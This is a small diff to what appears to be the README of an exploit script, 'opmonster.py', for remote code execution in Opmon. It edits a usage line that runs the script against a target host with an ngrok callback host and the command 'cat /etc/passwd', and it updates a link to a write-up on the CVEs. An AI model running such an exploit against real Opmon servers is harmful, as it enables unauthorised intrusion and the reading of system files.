@@ -5,9 +5,9 @@
   
   
  ```
- python3 opmonster.py https://vulnhost.com http://myhost.ngrok.io 1337 "cat /etc/passwd"
+ python3 opmonster.py https://vulnhost.com myhost.ngrok.io 80 "cat /etc/passwd"
  ```
 
 ### Remote code execution in Opmon
 
-[More info](https://medium.com/@ph0rensic/three-cves-on-opmon-3ca775a262f5)
+[More info](https://phor3nsic.gitbook.io/aboutme/articles/three-cves-on-opmon)
